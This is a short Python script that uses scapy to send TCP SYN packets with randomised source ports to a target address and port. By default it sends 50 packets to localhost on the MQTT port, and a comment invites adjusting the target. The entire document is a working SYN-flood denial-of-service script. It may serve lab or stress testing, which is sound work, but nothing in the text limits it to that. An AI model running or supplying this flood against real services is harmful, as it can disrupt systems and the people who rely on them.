from scapy.all import IP, TCP, send
import random

TARGET_IP, TARGET_PORT = "127.0.0.1", 1883 # For MQTT, adjust as needed
def syn_flood(num_pkts=50):
    for _ in range(num_pkts):
        p = IP(dst=TARGET_IP)/TCP(sport=random.randint(1024,65535), dport=TARGET_PORT, flags='S')
        send(p, verbose=0)
    print(f"Sent {num_pkts} SYNs to {TARGET_IP}:{TARGET_PORT}")

if __name__ == "__main__":
    syn_flood(50)

